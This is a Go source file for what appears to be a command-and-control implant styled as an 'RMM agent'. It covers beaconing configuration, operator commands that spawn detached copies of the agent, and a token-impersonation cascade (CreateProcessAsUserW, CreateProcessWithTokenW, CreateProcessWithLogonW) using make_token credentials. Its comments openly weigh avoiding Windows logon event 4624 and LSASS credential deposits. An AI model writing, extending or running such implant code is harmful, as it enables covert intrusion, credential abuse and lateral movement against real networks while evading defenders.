package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
)

// derivedSessionID generates an independent random identity for legacy commands.
// Parent and command metadata never become part of the session identifier.
func derivedSessionID(_, _ string) string {
	var identity [16]byte
	if _, err := rand.Read(identity[:]); err != nil {
		panic(fmt.Errorf("generate session identity: %w", err))
	}
	return hex.EncodeToString(identity[:])
}

// spawnSessionID names the detached second agent started by __SPAWN__.
func spawnSessionID(parent string) string {
	return derivedSessionID(parent, "spawn")
}

// spawnEnvironment builds the child environment with explicit connection
// settings. The fresh RMM_SESSION_ID always overrides any inherited value so
// the spawned agent can never reuse the parent's identity. When the parent
// has no explicit log file, the child gets its own diagnostics file instead
// of interleaving appends into the parent's default log path.
func spawnEnvironment(cfg *config, sessionID string) []string {
	overrides := map[string]string{
		"RMM_BASE_URL":               cfg.BaseURL,
		"RMM_BEACON_SECRET":          cfg.BeaconSecret,
		"RMM_SESSION_ID":             sessionID,
		"RMM_AGENT_WORKSPACE_ID":     cfg.WorkspaceID,
		"RMM_SLEEP_SECONDS":          strconv.Itoa(cfg.SleepSeconds),
		"RMM_JITTER_PERCENT":         strconv.Itoa(cfg.JitterPercent),
		"RMM_PERSISTENT_HTTP":        strconv.FormatBool(cfg.PersistentHTTP),
		"RMM_TLS_VERSION":            cfg.TLSVersion,
		"RMM_TLS_SESSION_RESUMPTION": strconv.FormatBool(cfg.TLSSessionResumption),
	}
	if cfg.HTTPProxy != "" {
		overrides["RMM_HTTP_PROXY"] = cfg.HTTPProxy
	}
	if os.Getenv("RMM_LOG_FILE") == "" {
		overrides["RMM_LOG_FILE"] = filepath.Join(os.TempDir(), "minimal-rmm-agent-"+sessionID+".log")
	}
	env := make([]string, 0, len(os.Environ())+len(overrides))
	for _, entry := range os.Environ() {
		key, _, _ := strings.Cut(entry, "=")
		if strings.EqualFold(key, "RMM_DEBUG") {
			continue
		}
		if _, overridden := overrides[strings.ToUpper(key)]; !overridden {
			env = append(env, entry)
		}
	}
	for key, value := range overrides {
		env = append(env, key+"="+value)
	}
	return env
}

// spawnAgent starts a second copy of this agent as a detached process with a
// fresh session ID. The child's standard streams connect to the null device
// and its lifetime is independent of the parent, so the spawn never blocks
// this agent's synchronous command loop. The command returns as soon as the
// child process is created, not when it exits.
func spawnAgent(cfg *config) (string, error) {
	return spawnAgentWithIdentity(cfg, spawnSessionID(cfg.SessionID))
}

// rejectCommandDebugOption rejects the removed runtime override without narrowing other options.
func rejectCommandDebugOption(body []byte) error {
	var options map[string]json.RawMessage
	if err := json.Unmarshal(body, &options); err != nil {
		return err
	}
	for key := range options {
		if strings.EqualFold(key, "debug") {
			return errors.New("debug is a build option, not a command option")
		}
	}
	return nil
}

// spawnasPayload carries a __SPAWNAS__ command's JSON body. It is shared by
// the legacy copy-of-self command and the staged-artifact variant, so both
// parse on every platform.
type spawnasPayload struct {
	SessionID   string  `json:"session_id"`
	WorkspaceID *string `json:"workspace_id,omitempty"`
	Domain      string  `json:"domain"`
	User        string  `json:"user"`
	Password    string  `json:"password"`
}

// parseSpawnasPayload validates the shared spawnas identity fields: a
// required user, optional domain, and DOMAIN\user splitting.
func parseSpawnasPayload(command string) (spawnasPayload, error) {
	var payload spawnasPayload
	parts := strings.SplitN(command, "\n", 2)
	if len(parts) != 2 || strings.TrimSpace(parts[1]) == "" {
		return payload, errors.New("missing JSON payload")
	}
	if err := rejectCommandDebugOption([]byte(parts[1])); err != nil {
		return payload, err
	}
	if err := json.Unmarshal([]byte(parts[1]), &payload); err != nil {
		return payload, err
	}
	payload.Domain = strings.TrimSpace(payload.Domain)
	payload.User = strings.TrimSpace(payload.User)
	if payload.Domain == "" && strings.Contains(payload.User, `\`) {
		p := strings.SplitN(payload.User, `\`, 2)
		payload.Domain = strings.TrimSpace(p[0])
		payload.User = strings.TrimSpace(p[1])
	}
	if payload.User == "" {
		return payload, errors.New("user is required")
	}
	return payload, nil
}

// identityLabel renders the operator-facing identity for spawnas replies.
func identityLabel(domain, user string) string {
	if domain != "" {
		return domain + `\` + user
	}
	return user
}

// parseSpawnCommand validates a server-selected session and workspace before
// any process is created. Legacy commands retain local identity generation.
func parseSpawnCommand(command string, cfg *config) (*config, string, error) {
	childConfig := *cfg
	if strings.TrimSpace(command) == "__SPAWN__" {
		return &childConfig, spawnSessionID(cfg.SessionID), nil
	}
	verb, body, found := strings.Cut(command, "\n")
	if !found || strings.TrimSpace(verb) != "__SPAWN__" {
		return nil, "", errors.New("spawn requires a JSON payload")
	}
	var payload struct {
		SessionID   string  `json:"session_id"`
		WorkspaceID *string `json:"workspace_id"`
	}
	if err := rejectCommandDebugOption([]byte(body)); err != nil {
		return nil, "", err
	}
	if err := json.Unmarshal([]byte(body), &payload); err != nil {
		return nil, "", errors.New("invalid spawn payload")
	}
	if !agentSessionIDPattern.MatchString(payload.SessionID) || payload.SessionID == cfg.SessionID {
		return nil, "", errors.New("spawn requires a fresh token-safe session ID")
	}
	if payload.WorkspaceID != nil {
		if *payload.WorkspaceID != "" && !agentWorkspaceIDPattern.MatchString(*payload.WorkspaceID) {
			return nil, "", errors.New("invalid spawn workspace ID")
		}
		childConfig.WorkspaceID = *payload.WorkspaceID
	}
	return &childConfig, payload.SessionID, nil
}

// spawnCommand honors the server-selected identity so registration can be
// correlated independently of the command acknowledgement.
func spawnCommand(command string, cfg *config) (string, error) {
	childConfig, sessionID, err := parseSpawnCommand(command, cfg)
	if err != nil {
		return "", err
	}
	return spawnAgentWithIdentity(childConfig, sessionID)
}

// spawnAgentWithIdentity starts the validated child under its selected identity.
func spawnAgentWithIdentity(cfg *config, sessionID string) (string, error) {
	if memoryHosted() {
		return "", errMemoryHosted
	}
	executable, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("resolve agent executable: %w", err)
	}
	// Deliberately exec.Command, not newCommand: newCommand binds children to
	// agentContext, and canceling this agent must not kill the spawned one.
	child := exec.Command(executable)
	child.Env = spawnEnvironment(cfg, sessionID)
	child.Stdin = nil
	child.Stdout = nil
	child.Stderr = nil
	detachSpawnCommand(child)
	diagnostics := &spawnDiagnostics{}
	pid, method, degraded, exposure, err := startDetachedAgent(child, diagnostics)
	// Record the echelon and exposure in diagnostics before marshaling.
	diagnostics.CredentialExposure = string(exposure)
	switch method {
	case "CreateProcessAsUser":
		diagnostics.Echelon = 1
	case "CreateProcessWithTokenW":
		diagnostics.Echelon = 2
	case "CreateProcessWithLogonW":
		diagnostics.Echelon = 3
	case "CreateProcessA":
		diagnostics.Echelon = 4
	}
	detail, _ := json.Marshal(diagnostics)
	if err != nil {
		return "", fmt.Errorf("start spawned agent: %w\nspawn diagnostics=%s", err, detail)
	}
	networkIdentity := diagnostics.NetworkIdentity
	identityLine := ""
	if networkIdentity != "" {
		identityLine = fmt.Sprintf("\nspawn identity=%s", networkIdentity)
	}
	return fmt.Sprintf("spawned session=%s pid=%d\nspawn method=%s identity_degraded=%t echelon=%d credential_exposure=%s%s\nspawn diagnostics=%s",
		sessionID, pid, method, degraded, diagnostics.Echelon, exposure, identityLine, detail), nil
}

type spawnAttemptDiagnostic struct {
	Method    string `json:"method"`
	Success   bool   `json:"success"`
	ErrorCode uint32 `json:"error_code,omitempty"`
	Error     string `json:"error,omitempty"`
}

type spawnDiagnostics struct {
	ProcessIdentity      string                   `json:"process_identity,omitempty"`
	NetworkIdentity      string                   `json:"network_identity,omitempty"`
	ActiveToken          bool                     `json:"active_token"`
	TokenType            string                   `json:"token_type,omitempty"`
	CredentialsAvailable bool                     `json:"credentials_available"`
	CreationFlags        uint32                   `json:"creation_flags,omitempty"`
	Echelon              int                      `json:"echelon,omitempty"`
	CredentialExposure   string                   `json:"credential_exposure,omitempty"`
	ProcessPrivileges    map[string]string        `json:"process_privileges,omitempty"`
	TokenPrivileges      map[string]string        `json:"token_privileges,omitempty"`
	Attempts             []spawnAttemptDiagnostic `json:"attempts"`
}

// spawnMethods holds the per-echelon process creation callbacks.
// Echelon 1: createProcessAsUser — CreateProcessAsUserW with the duplicated
//
//	make_token handle. Preserves netonly semantics (local = agent, network =
//	alternate). No 4624, no LSASS deposit.
//
// Echelon 2: createProcessWithToken — CreateProcessWithTokenW with the same
//
//	handle. Requires SeImpersonatePrivilege. Same netonly semantics.
//
// Echelon 3: createProcessWithLogon — CreateProcessWithLogonW with the
//
//	plaintext credentials stored by make_token. Full interactive logon
//	(type 2): 4624, creds cached in LSASS, alternate identity everywhere.
//
// Echelon 4: original — CreateProcessA with the agent's own identity.
//
//	Silent fallback when no make_token is active.
type spawnMethods struct {
	createProcessAsUser    func() (int, error) // echelon 1: token via SysProcAttr
	createProcessWithToken func() (int, error) // echelon 2: CreateProcessWithTokenW
	createProcessWithLogon func() (int, error) // echelon 3: CreateProcessWithLogonW
	original               func() (int, error) // echelon 4: CreateProcessA
}

// credentialExposure describes how the successful echelon exposes the
// operator's credentials. The operator can't miss a credential deposit.
type credentialExposure string

const (
	credentialExposureNone  credentialExposure = "none"  // echelon 1 & 2: netonly, nothing cached
	credentialExposureLSASS credentialExposure = "lsass" // echelon 3: type 2 logon, creds in LSASS
	credentialExposureAgent credentialExposure = "agent" // echelon 4: agent identity, no alternate
)

// recordAttempt appends a diagnostics entry for a single echelon attempt.
func recordAttempt(diag *spawnDiagnostics, method string, err error) {
	if diag == nil {
		return
	}
	result := spawnAttemptDiagnostic{Method: method, Success: err == nil}
	if err != nil {
		var code syscall.Errno
		if errors.As(err, &code) {
			result.ErrorCode, result.Error = uint32(code), code.Error()
			if code == 0 {
				result.Error = "process creation failed without a Windows error code"
			}
		} else {
			result.Error = "process creation failed"
		}
	}
	diag.Attempts = append(diag.Attempts, result)
}

// dispatchSpawn walks the echelon cascade: 1 → 2 → 3 → 4.
// Echelons 1 and 2 are tried only when a make_token identity is active.
// Echelon 3 is tried only when plaintext credentials are available.
// Echelon 4 is the unconditional fallback.
//
// Returns: pid, method name, identity_degraded (child != alternate), credential_exposure, error.
func dispatchSpawn(active bool, creds bool, methods spawnMethods, diagnostics ...*spawnDiagnostics) (int, string, bool, credentialExposure, error) {
	if identityBoundaryFault.Load() {
		return 0, "", false, "", errIdentityUnsafe
	}
	var diag *spawnDiagnostics
	if len(diagnostics) > 0 {
		diag = diagnostics[0]
	}

	// Echelon 1: CreateProcessAsUserW (needs SeAssignPrimaryTokenPrivilege)
	if active && methods.createProcessAsUser != nil {
		pid, err := methods.createProcessAsUser()
		recordAttempt(diag, "CreateProcessAsUser", err)
		if err == nil {
			return pid, "CreateProcessAsUser", false, credentialExposureNone, nil
		}
		// Fall through on ERROR_PRIVILEGE_NOT_HELD (1314) or any failure.
	}

	// Echelon 2: CreateProcessWithTokenW (needs SeImpersonatePrivilege)
	if active && methods.createProcessWithToken != nil {
		pid, err := methods.createProcessWithToken()
		recordAttempt(diag, "CreateProcessWithTokenW", err)
		if err == nil {
			return pid, "CreateProcessWithTokenW", false, credentialExposureNone, nil
		}
	}

	// Echelon 3: CreateProcessWithLogonW (plaintext creds, type 2 logon)
	// WARNING: this deposits credentials in LSASS on the local host.
	if creds && methods.createProcessWithLogon != nil {
		pid, err := methods.createProcessWithLogon()
		recordAttempt(diag, "CreateProcessWithLogonW", err)
		if err == nil {
			return pid, "CreateProcessWithLogonW", false, credentialExposureLSASS, nil
		}
	}

	// Echelon 4: CreateProcessA (agent identity, unconditional fallback)
	pid, err := methods.original()
	recordAttempt(diag, "CreateProcessA", err)
	if err != nil {
		return 0, "", false, "", fmt.Errorf("CreateProcessA: %w", err)
	}
	return pid, "CreateProcessA", active, credentialExposureAgent, nil
}
